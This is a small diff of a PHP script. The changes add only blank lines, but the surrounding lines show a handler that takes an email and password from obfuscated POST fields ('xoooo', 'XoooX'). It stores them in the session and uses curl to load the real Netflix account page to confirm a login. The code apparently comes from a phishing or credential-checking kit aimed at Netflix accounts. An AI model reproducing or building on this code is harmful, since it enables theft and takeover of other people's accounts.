@@ -53,6 +53,7 @@ function fetch_value($str, $find_start, $find_end)
 }
 if (isset($_POST['xoooo']) && isset($_POST['XoooX']))
 {
+    
     delete_cookies();
 
     $_SESSION['EM'] = $_POST['xoooo'];
@@ -75,6 +76,7 @@ if (isset($_POST['xoooo']) && isset($_POST['XoooX']))
     }
     else
     {
+        
         $get_page = curl('https://www.netflix.com/youraccount');
         //------------------ Login Success
         $_SESSION['accpage'] = $get_page = curl('https://www.netflix.com/youraccount');
